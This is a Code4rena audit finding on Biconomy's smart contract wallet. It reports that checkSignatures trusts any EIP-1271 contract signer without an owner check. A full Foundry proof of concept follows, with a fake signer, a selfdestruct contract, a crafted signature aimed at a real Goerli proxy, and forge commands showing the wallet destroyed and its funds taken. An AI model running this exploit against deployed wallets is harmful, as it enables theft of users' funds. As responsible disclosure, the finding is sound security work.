## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-04

# [Arbitrary transactions possible due to insufficient signature validation](https://github.com/code-423n4/2023-01-biconomy-findings/issues/175) 

# Lines of code

https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342


# Vulnerability details

## Impact

A hacker can create arbitrary transaction through the smart wallet by evading signature validation. 

Major impacts:
1. Steal **all** funds from the smart wallet and destroy the proxy
2. Lock the wallet from EOAs by updating the implementation contract
	1. New implementation can transfer all funds or hold some kind of ransom
	2. New implementation can take time to unstake funds from protocols

## Proof of Concept

The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction:
https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218
https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342
```
function execTransaction(
        Transaction memory _tx,
        uint256 batchId,
        FeeRefund memory refundInfo,
        bytes memory signatures
    ) public payable virtual override returns (bool success) {
---------
            checkSignatures(txHash, txHashData, signatures);
        }
---------
            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);
---------
        }
    }

function checkSignatures(
        bytes32 dataHash,
        bytes memory data,
        bytes memory signatures
    ) public view virtual {
----------
        if(v == 0) {
----------
            _signer = address(uint160(uint256(r)));
----------
                require(uint256(s) >= uint256(1) * 65, "BSA021");
----------
                require(uint256(s) + 32 <= signatures.length, "BSA022");
-----------
                assembly {
                    contractSignatureLen := mload(add(add(signatures, s), 0x20))
                }
                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, "BSA023");
-----------
                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "BSA024");
-----------
    }
```

`checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract. 

A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function. 

As `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.

### Impact #1 - Self destruct and steal all funds

Consider the following scenario:
1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 
2. Hacker creates `SelfDestructingContract` that `selfdestruct`s when called
3. Hacker calls the smart wallets `execTransaction` function
	1. The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`
	2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`
4. Proxy contract is destroyed 
	1. Hacker received all funds that were in the wallet

### Impact #2 - Update implementation and lock out EOA  

1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 
2. Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker
3. Hacker calls the smart wallets `execTransaction` function
	1. The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)` 
	2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`
4. Implementation was updated to `MaliciousImplementation`
	1. Hacker transfers all native and ERC20 tokens to himself
	2. Hacker unstakes EOA funds from protocols 
	3. Hacker might try to ransom the protocol/EOAs to return to previous implementation
5. Proxy cannot be redeployed for the existing EOA

### Foundry POC

The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.

The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.

The POC use a smart wallet proxy contract that is deployed on `goerli` chain:
proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09

You will need to install a foundry. Please follow these instruction for the setup:
https://book.getfoundry.sh/getting-started/installation

After installing, create a workdir by issuing the command: `forge init --no-commit` 

Create the following file in `test/DestroyWalletAndStealFunds.t.sol`:
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract Enum {
    enum Operation {Call, DelegateCall}
}
interface SmartAccount {
    function execTransaction(
        Transaction memory _tx,
        uint256 batchId,
        FeeRefund memory refundInfo,
        bytes memory signatures
    ) external payable returns (bool success); 
    function getNonce(uint256 batchId) external view returns (uint256);
}
struct Transaction {
        address to;
        uint256 value;
        bytes data;
        Enum.Operation operation;
        uint256 targetTxGas;
    }
struct FeeRefund {
        uint256 baseGas;
        uint256 gasPrice; //gasPrice or tokenGasPrice
        uint256 tokenGasPriceFactor;
        address gasToken;
        address payable refundReceiver;
    }
contract FakeSigner {
    bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;

    // Always return valid EIP1271_MAGIC_VALUE
    function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {
        return EIP1271_MAGIC_VALUE;
    }
}
contract SelfDestructingContract {
    // All this does is self destruct and send funds to "to"
    function selfDestruct(address to) external {
        selfdestruct(payable(to));
    }
}

contract DestroyWalletAndStealFunds is Test {
    SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);
    address hacker = vm.addr(0x1337);
    SelfDestructingContract sdc;
    FakeSigner fs;
    function setUp() public {
        // Create self destruct contract
        sdc = new SelfDestructingContract();
        // Create fake signer
        fs = new FakeSigner();

        // Impersonate hacker
        vm.startPrank(hacker);
        // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker 
        bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);
        // Create transaction specifing SelfDestructingContract as target and as a delegate call
        Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);
        // Create FeeRefund
        FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));

        bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));
        // Add fake signature (r,s,v) to pass all requirments.
        // v=0 to indicate eip-1271 signer "fakeSignerPadded" which will always return true
        bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));
        // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.
        proxySmartAccount.execTransaction(transaction, 0, fr, signatures);
        vm.stopPrank();
    }

    function testProxyDoesNotExist() public {
        uint size;
        // Validate that bytecode size of the proxy contract is 0 becuase of self destruct 
        address proxy = address(proxySmartAccount);
        assembly {
          size := extcodesize(proxy)
        }
        assertEq(size,0);
    }

    function testRevertWhenCallingWalletThroughProxy() public {
        // Revert when trying to call a function in the proxy 
        proxySmartAccount.getNonce(0);
    }
}
```

To run the POC and validate that the proxy does not exist after destruction:
```
forge test -m testProxyDoesNotExist -v --fork-url="<GOERLI FORK RPC>"
```

Expected output: 
```
Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds
[PASS] testProxyDoesNotExist() (gas: 4976)
Test result: ok. 1 passed; 0 failed; finished in 4.51s
```

To run the POC and validate that the EOA cannot interact with the wallet after destruction:
```
forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url="<GOERLI FORK RPC>"
```

Expected output: 
```
Failing tests:
Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds
[FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)
```

## Tools Used

Foundry, VS Code

## Recommended Mitigation Steps

The protocol should validate before calling `isValidSignature` that `_signer` is `owner` 